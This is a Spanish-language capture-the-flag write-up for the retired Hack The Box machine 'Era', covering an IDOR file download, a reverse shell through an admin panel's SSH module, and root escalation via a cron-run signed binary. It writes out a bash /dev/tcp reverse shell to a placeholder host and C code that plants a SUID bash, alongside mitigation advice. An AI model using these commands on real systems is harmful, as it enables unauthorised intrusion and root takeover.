---
machine: Era
os: Linux
difficulty: Medium
platform: Hack The Box
category: Web
state: Retired
pwned: false
tags: [linux, web, idor, php, cron, binary-signing, privesc]
---

# Era — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin credenciales ni flags reales.

## Resumen

Aplicación de subida de ficheros con varios IDOR. Se crea una cuenta, se descarga un backup de la cuenta admin y se obtiene acceso al panel. El panel incluye un módulo PHP que usa SSH para ejecutar comandos; se abusa para obtener una shell como `eric`. La escalada reemplaza `monitor`, un binario firmado que un cron ejecuta como root cada minuto, por un ELF firmado que crea un bash SUID.

## Enumeración

```bash
nmap -p- --min-rate 5000 -T4 <IP>
gobuster dir -u http://era.htb -w /usr/share/wordlists/dirb/common.txt
```

La aplicación permite registrar usuarios y subir ficheros. Se revisan las rutas de descarga y los identificadores numéricos; un IDOR permite leer el backup del administrador.

```bash
curl -s -b 'session=<COOKIE>' 'http://era.htb/download?id=<ID>'
```

El backup contiene código y credenciales de la base de datos. Con ellas se accede al panel de administración.

## Acceso inicial

El panel tiene un módulo de conexión SSH que acepta host, usuario y comando. Se usa para ejecutar una reverse shell como `eric`:

```text
host: 127.0.0.1
user: eric
command: bash -c 'bash -i >& /dev/tcp/<IP>/443 0>&1'
```

```bash
nc -lnvp 443
```

## Escalada

`/opt/AV/periodic-checks/monitor` es un ELF propiedad de `root:devs`, escribible por el grupo `devs`. Un cron lo ejecuta cada minuto como root y valida una firma en `.text_sig`.

```bash
ls -l /opt/AV/periodic-checks/
id
```

Se compila un binario que crea un bash SUID, se firma con la clave disponible en el entorno y se reemplaza `monitor`:

```c
#include <unistd.h>
#include <stdlib.h>
int main(void) {
    setuid(0); setgid(0);
    system("cp /bin/bash /tmp/rootbash && chmod 6777 /tmp/rootbash");
}
```

```bash
gcc exploit.c -o exploit
./elf-sign sha256 key.pem key.pem exploit monitor
```

En el siguiente minuto:

```bash
/tmp/rootbash -p
```

## Flags

- `user.txt`: `<USER_FLAG>`
- `root.txt`: `<ROOT_FLAG>`

## Lecciones

- Los IDOR en descargas y perfiles permiten saltar de usuario.
- Un módulo SSH en un panel web es ejecución remota por diseño.
- Un binario escribible ejecutado por cron es una vía directa a root.
- La firma de código solo protege si la clave no está accesible al atacante.

## Detección y mitigación

- Validar autorización en cada descarga, no solo en la interfaz.
- No permitir que usuarios web ejecuten comandos SSH arbitrarios.
- Monitorizar cambios en binarios ejecutados por cron y su firma.
- Separar la clave de firma del host y aplicar integridad (AIDE, auditd).

## Referencias

- <https://0xdf.gitlab.io/2025/11/29/htb-era.html>
- <https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control>
- <https://attack.mitre.org/techniques/T1053/003/>
